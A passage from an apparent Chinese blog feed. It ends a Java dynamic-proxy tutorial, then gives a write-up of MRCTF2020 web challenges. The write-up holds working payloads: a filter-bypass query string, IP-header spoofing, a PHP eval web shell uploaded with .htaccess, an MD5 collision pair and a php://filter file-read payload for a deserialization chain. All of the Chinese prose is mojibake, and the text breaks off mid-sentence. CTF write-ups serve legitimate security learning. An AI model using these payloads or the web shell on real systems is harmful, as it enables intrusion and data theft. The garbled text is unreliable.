<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[Ljava.lang.Class;@<span class="number">7f</span>31245a</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¾¿å¾—åˆ°äº†ç±»çš„æ¥å£äº†ï¼Œåªä¸è¿‡è¿™é‡Œæ˜¯ä»¥æµçš„æ–¹å¼è¿›è¡Œä¼ è¾“</p>
<h2 id="getClass-getName"><a href="#getClass-getName" class="headerlink" title="getClass().getName()"></a>getClass().getName()</h2><p>è¿™æ ·çš„ä¹Ÿå¾ˆç®€å•ç†è§£ï¼Œæˆ‘ä»¬å³ä½¿getClassäº†ï¼Œç¨‹åºå´ä¸çŸ¥é“å®ƒçš„åå­—ï¼Œç¨‹åºåªçŸ¥é“æ˜¯ä¸€ä¸ªç±»ï¼Œæ•…æˆ‘ä»¬ä½¿ç”¨getNameå³å¯å¾—åˆ°å½“å‰å®ä¾‹çš„ç±»çš„åå­—ï¼ˆStringå½¢å¼ï¼‰</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        myDemo wdnmd = <span class="keyword">new</span> myDemo();</span><br><span class="line"><span class="comment">//        System.out.println(myDemo);</span></span><br><span class="line">        System.out.println(wdnmd.getClass().getName());</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>

<p>å¥½åƒå†™ä¸€ä¸ªåŠ¨æ€ä»£ç†ä¹Ÿå°±ç”¨åˆ°äº†è¿™äº›ï¼Œå˜›ï¼Œç»§ç»­å¾€ä¸‹å§</p>
<h1 id="åŠ¨æ€ä»£ç†"><a href="#åŠ¨æ€ä»£ç†" class="headerlink" title="åŠ¨æ€ä»£ç†"></a>åŠ¨æ€ä»£ç†</h1><h2 id="2-1-æ¥å£"><a href="#2-1-æ¥å£" class="headerlink" title="2.1 æ¥å£"></a>2.1 æ¥å£</h2><p>é¦–å…ˆå’Œé™æ€ä»£ç†æ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬ä¹Ÿéœ€è¦æ„ç­‘ä¸€ä¸ªæ¥å£ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> myProxy2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åŒæ ·çš„ï¼Œä¸šåŠ¡å®ä½“æ˜¯ä¸å¯é¿å…çš„</p>
<h2 id="2-2å®ä½“ç±»ï¼š"><a href="#2-2å®ä½“ç±»ï¼š" class="headerlink" title="2.2å®ä½“ç±»ï¼š"></a>2.2å®ä½“ç±»ï¼š</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> myProxy2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImp</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;å¢æ·»äº†ä¸€ä¸ªæ–°ç”¨æˆ·&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;åˆ é™¤äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ›´æ–°äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æŸ¥è¯¢äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è€Œä»£ç†ç±»ï¼Œé€šè¿‡åŠ¨æ€ä»£ç†æˆ‘ä»¬å¯ä»¥ç›´æ¥çš„ç”Ÿæˆï¼Œå–æ¶ˆç¹ççš„æ“ä½œ</p>
<p>å¦‚æœç”¨é™æ€ä»£ç†ï¼Œæˆ‘ä»¬çš„ä»£ç†æ˜¯è¿™æ ·çš„ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> myProxy2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceProxy</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UserServiceImp userServiceImp;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserServiceImp</span><span class="params">(UserServiceImp userServiceImp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userServiceImp = userServiceImp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;add&quot;</span>);</span><br><span class="line">        userServiceImp.add();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;åˆ é™¤&quot;</span>);</span><br><span class="line">        userServiceImp.delete();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;æ›´æ–°&quot;</span>);</span><br><span class="line">        userServiceImp.update();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;æŸ¥è¯¢&quot;</span>);</span><br><span class="line">        userServiceImp.query();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">log</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[DEBUG]æ‰§è¡Œäº†&quot;</span>+name+<span class="string">&quot;æ–¹æ³•&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>è€Œä½¿ç”¨åŠ¨æ€ä»£ç†ä¹‹åï¼š</p>
<h2 id="2-3ä»£ç†ç±»"><a href="#2-3ä»£ç†ç±»" class="headerlink" title="2.3ä»£ç†ç±»"></a>2.3ä»£ç†ç±»</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Demo3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> myProxy2.UserServiceImp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProxyInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UserServiceImp userServiceImp;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    IOCï¼Œè®©ç”¨æˆ·è‡ªå®šä¹‰éœ€è¦ä»€ä¹ˆæ¥å£æ¥å†³å®šä»£ç†ç±»</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserServiceImp</span><span class="params">(UserServiceImp userServiceImp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userServiceImp = userServiceImp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    ç”Ÿæˆä»£ç†ç±»</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getProxy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(<span class="keyword">this</span>.getClass().getClassLoader(),</span><br><span class="line">                userServiceImp.getClass().getInterfaces(),<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//    å¿…é¡»é‡å†™çš„æ¥å£ï¼Œå¹¶è¿”å›æ¥å£</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">        Object result = method.invoke(userServiceImp, args);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å‘ç°ä¸å†éœ€è¦ä¸€ä¸ªä¸€ä¸ªå¥—æ¨¡æ¿å¾€ä¸Šå†™äº†ï¼Œå¦‚æœæˆ‘ä»¬éœ€è¦å¢æ·»æ–°åŠŸèƒ½ï¼Œåªéœ€è¦è¿™æ ·åšï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="comment">//    å¿…é¡»é‡å†™çš„æ¥å£ï¼Œå¹¶è¿”å›æ¥å£</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        log(method.getName());</span><br><span class="line">        Object result = method.invoke(userServiceImp, args);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">log</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[DEBUG]ä½¿ç”¨äº†&quot;</span>+name+<span class="string">&quot;æ–¹æ³•&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>è™½ç„¶æˆ‘ä»¬å‰é¢å»å†™ç”Ÿæˆä¸€ä¸ªçš„ä»£ç é‡çœ‹ä¼¼å¾ˆå¤§ï¼Œä½†æ˜¯å®é™…ä¸Šè¿™æ®µä»£ç æ˜¯ä¸€ä¸ªå·¥å…·ç”¨çš„ä»£ç ï¼Œ<strong>æ˜¯å†™æ­»çš„ã€‚</strong>ä¸šåŠ¡ä»£ç ç›¸å½“çš„ç«¯ï¼Œä»å‡ åè¡Œéª¤å‡åˆ°åæ¥è¡Œï¼Œå¹¶ä¸”æˆ‘ä»¬çš„ä»£ç†ç±»ä¸ä¼šéšç€å·¥ç¨‹çš„å˜å¤§è€Œå˜å¤§ï¼Œæˆ‘ä»¬é€šè¿‡åå°„ä¹‹åè·å–äº†ç±»çš„æ–¹æ³•</p>
<p>è€Œæºç å½“ä¸­ï¼Œinvokeæ–¹æ³•å®é™…ä¸Šä¹Ÿæ˜¯é€šè¿‡setAccessibleæ¥å®ç°çš„</p>
<p><img src="image-20201110203729995.png" alt="image-20201110203729995"></p>
]]></content>
  </entry>
  <entry>
    <title>MRCTF2020</title>
    <url>/2020/10/29/MRCTF2020/</url>
    <content><![CDATA[<p>æ€ä¹ˆè¯´å‘¢ã€‚ã€‚æ˜¯æ–°æ‰‹é¢˜ç›®ï¼Œåˆä¸å¤ªåƒï¼Œæœ‰äº›é¢˜ç›®è„‘æ´æœ‰ç‚¹å¤§</p>
<h1 id="1-å¥—å¨ƒ"><a href="#1-å¥—å¨ƒ" class="headerlink" title="1.å¥—å¨ƒ"></a>1.å¥—å¨ƒ</h1><p>è¯»æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$query = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count($query, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>($_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, $_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­å¯ä»¥çœ‹è§è¿‡æ»¤_å’Œ%5fï¼Œé‚£æˆ‘ä»¬ç¼–ç ç»•è¿‡å°±æ— åŠæ³•äº†å•Šï¼Œä½†æ˜¯æ‰¾åˆ°å‚è€ƒæ–‡çŒ®ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;213359.html</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­å¯¹è¿™ç§çš„ç»•è¿‡</p>
<p><img src="image-20201029175514743.png" alt="image-20201029175514743"></p>
<p>äºæ˜¯æˆ‘ä»¬æ„é€ ç©ºæ ¼æ¥ç»•è¿‡ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?b%20u%20p%20t&#x3D;23333%0a</span><br></pre></td></tr></table></figure>

<p>ä¹‹ååœ¨secrettw.phpä¸­ï¼ŒJSfcukç¿»è¯‘å³å¯å¾—åˆ°è®©ä¼ å€¼è¯»å–æºç ï¼š</p>
<p><img src="image-20201029175921389.png" alt="image-20201029175921389"></p>
<p>è¯»å–åˆ°æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params">$v</span>)</span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents($_GET[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.change($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­å¯¹IPè¿›è¡Œäº†ä¸€æ¬¡checkï¼ŒXFFä¸å¯ç”¨ï¼Œç”¨Clinet-IPå³å¯ç»•è¿‡</p>
<p><img src="image-20201029180308506.png" alt="image-20201029180308506"></p>
<p>ä¹‹åçœ‹ä¸Šé¢çš„ç®€å•å‡½æ•°çš„é€†å‘ï¼ŒæŠŠåŠ å·æ”¹æˆå‡å·å°±è¡Œäº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$v = <span class="string">&quot;fj]a&amp;f\b&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unchange</span>(<span class="params">$v</span>)</span>&#123;</span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params">$v</span>)</span>&#123;</span><br><span class="line">    $v = base64_decode($v);</span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $re;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> (change(<span class="string">&quot;ZmpdYSZmXGI=&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>æ¯”è¾ƒæ¶å¿ƒåˆ°äººçš„æ˜¯2333çš„è¾“å‡ºï¼Œæˆ‘ä¹‹å‰æ— è®ºå¦‚ä½•è¾“å…¥éƒ½ä¸è¡Œï¼Œä¸€åº¦æ€€ç–‘äººç”Ÿï¼Œæœ€åæ‰¾åˆ°dataçš„ä¼ªåè®®å¯ä»¥ç»•è¿‡ï¼Œå‚è€ƒæ–‡ç« ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;nzjdsds&#x2F;article&#x2F;details&#x2F;82461043</span><br></pre></td></tr></table></figure>

<p>æœ€åæˆåŠŸæ‹¿åˆ°flagï¼Œflagåœ¨æºç ä¸­ï¼š</p>
<p><img src="image-20201029180627670.png" alt="image-20201029180627670"></p>
<h1 id="2-ä½ ä¼ ä½ ğŸå‘¢"><a href="#2-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="2.ä½ ä¼ ä½ ğŸå‘¢"></a>2.ä½ ä¼ ä½ ğŸå‘¢</h1><p>åˆ†åˆ«ä¸Šä¼ .htaccesså’Œä¸€å¥è¯å³å¯ï¼š</p>
<p><img src="image-20201029182056361.png" alt="image-20201029182056361"></p>
<p>ä¸€å¥è¯ç”¨aspçš„æ ¼å¼ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>($_POST[<span class="number">1</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="image-20201029182147837.png" alt="image-20201029182147837"></p>
<p>ä¹‹åç”¨èšå‰‘ğŸ”—æ‹¿flagå³å¯ï¼Œè¿™é“é¢˜æˆ‘æ¯”è¾ƒå¥‡æ€ªçš„å°±æ˜¯è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œä½†æ˜¯åˆæ²¡å•¥ç”¨,æˆ‘çŒœæµ‹æ˜¯å‡ºé¢˜äººè¿‡æ»¤ä¸å¤Ÿï¼Ÿä¸ç„¶å¯ä»¥ç”¨disable_functionçš„æ¥åšçš„,è¿‡æ»¤å¦‚ä¸‹ï¼škâ€™hâ€™j</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld	</span><br></pre></td></tr></table></figure>

<h1 id="3-Ez-bypass"><a href="#3-Ez-bypass" class="headerlink" title="3.Ez_bypass"></a>3.Ez_bypass</h1><p>MD5å¼ºç­‰äºç»•è¿‡å’Œå¼±ç­‰äºç»•è¿‡ï¼š</p>
<p><img src="image-20201029190823452.png" alt="image-20201029190823452"></p>
<p>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨ä¸‹é¢è¿™ä¸¤ç»„æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hexString1 = <span class="string">&#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&#x27;</span></span><br><span class="line">hexString2 = <span class="string">&#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒæ­¥ï¼›</p>
<p><img src="image-20201029190903989.png" alt="image-20201029190903989"></p>
<h1 id="4-PYWebsite"><a href="#4-PYWebsite" class="headerlink" title="4.PYWebsite"></a>4.PYWebsite</h1><p><img src="image-20201029190958345.png" alt="image-20201029190958345"></p>
<p>çœ‹åˆ°è¿™å¥è¯ï¼Œç›´æ¥ä¼ªé€ XFFå³å¯</p>
<p><img src="image-20201029191040967.png" alt="image-20201029191040967"></p>
<h1 id="5-Ezpop"><a href="#5-Ezpop" class="headerlink" title="5.Ezpop"></a>5.Ezpop</h1><p>é¦–å…ˆå®¡è®¡æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>æˆ‘è‡ªå·±å®¡è®¡çš„æ—¶å€™æ„Ÿè§‰æœ‰ç‚¹æ‡µï¼Œé¦–å…ˆæˆ‘ä»¬å¯èƒ½è¦ç”¨åˆ°çš„æ˜¯includeè¿™ä¹ˆä¸€ä¸ªå‡½æ•°ï¼Œè€Œvarå‡½æ•°ä¼šåœ¨__invokeçš„æ—¶å€™å»è°ƒç”¨$varï¼Œè¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œäºæ˜¯æˆ‘ä»¬æ„é€ å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$var=<span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>æ¥ç€å°±æ˜¯å»æ‰¾å“ªé‡Œå¯ä»¥è°ƒç”¨åˆ°è¿™ä¹ˆä¸€ä¸ª__invokeæ–¹æ³•äº†ï¼Œæ ¹æ®PHPçš„æ‰‹å†Œï¼Œæˆ‘ä»¬ä¼šåœ¨ å‡½æ•°è¢«å½“æˆæ–¹æ³•è°ƒç”¨çš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨ï¼Œä¾‹å­å¦‚ä¸‹ï¼š</p>
